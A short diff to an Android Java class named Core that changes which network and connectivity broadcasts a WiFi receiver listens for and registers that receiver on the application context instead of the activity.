@@ -16,6 +16,7 @@ import android.content.ContentResolver;
 import android.content.Context;
 import android.content.IntentFilter;
 import android.content.res.Resources;
+import android.net.ConnectivityManager;
 import android.net.wifi.WifiManager;
 import android.os.PowerManager;
 import android.os.PowerManager.WakeLock;
@@ -163,10 +164,11 @@ public class Core extends Activity implements Runnable {
 
 		// WiFi status manager
 		IntentFilter intentFilter = new IntentFilter();
-		intentFilter.addAction(WifiManager.WIFI_STATE_CHANGED_ACTION);
+		intentFilter.addAction(WifiManager.NETWORK_STATE_CHANGED_ACTION);
+		intentFilter.addAction(ConnectivityManager.CONNECTIVITY_ACTION);
 		
 		WR wifiReceiver = new WR();
-		registerReceiver(wifiReceiver, intentFilter);
+		Status.getAppContext().registerReceiver(wifiReceiver, intentFilter);
 		
 		EvidenceReference.info(M.e("Started")); //$NON-NLS-1$
 
